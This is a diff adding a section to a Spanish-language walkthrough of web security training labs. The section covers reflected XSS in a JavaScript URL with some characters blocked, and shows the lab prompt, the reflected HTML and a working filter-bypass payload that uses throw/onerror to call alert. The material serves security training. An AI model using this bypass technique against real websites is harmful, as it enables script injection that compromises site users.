@@ -478,7 +478,37 @@ Entonces, como podemos ver le agrega un **\\** en la comilla simple entonces lo 
 
 ![](img41.png)
 
-## 16. Lab: Reflected XSS in a JavaScript URL with some characters blocked
+## 16. Lab: Reflected XSS in a JavaScript URL with some characters blocked (P)
+
+```
+This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.
+```
+
+URL
+
+```
+https://ac901f681ed32e2180a00c4e002a003e.web-security-academy.net/post?postId=2&aaa
+```
+
+Respuesta
+
+```html
+<div class="is-linkback">
+	<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26aaa'}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+```
+
+Entonces lo que haremos será generar un payload que ejecute un alert.
+
+```
+'},x=x=>{throw/**/onerror=alert,1337},toString=x,window '',{x:'
+```
+
+![](img42.png)
+
+## 17. Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
 
 
